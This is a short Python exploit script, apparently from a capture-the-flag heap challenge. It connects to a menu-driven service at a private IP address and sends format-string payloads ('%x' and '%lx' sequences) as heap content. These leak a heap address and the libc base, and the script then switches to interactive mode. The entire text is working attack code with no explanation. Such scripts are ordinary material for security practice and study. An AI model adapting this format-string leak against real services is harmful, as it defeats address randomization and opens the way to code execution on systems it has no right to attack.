from PwnIOI import *

s = IOI(['192.168.0.85',56746])
def create_heap(name,types,content=''):
  s.read_until('choice :')
  s.write('1\n')
  s.read_until('Name of heap:')
  s.write(name)
  s.read_until('choice :')
  if types==1:
    s.write('1\n')
    s.read_until('Content of heap :')
    s.write(content)
  else:
    s.write(str(types)+'\n')
raw_input()
create_heap('1234',1,'%x'*5+'[%s]')
s.read_until('choice :')
s.write('4\n')
s.read_until('Index of heap :')
s.write('0\n')
s.read_until('choice :')
s.write('1\n')
s.read_until('[')
r = s.read(4)
if r[3:] == '\x5d':
  heap = u64(r[:3]+'\x00'*5) - 0x10
else:
  heap = u64(r+'\x00'*4) - 0x10
log(" heap : 0x%x"%heap)
s.write('3\n')
create_heap('1234',1,'[%lx]')
s.read_until('choice :')
s.write('4\n')
s.read_until('Index of heap :')
s.write('1\n')
s.read_until('choice :')
s.write('1\n')
s.read_until('[')
libc = int(s.read(12),16) - 0x3c5780
log(" libc : 0x%x"%libc)
s.interact()
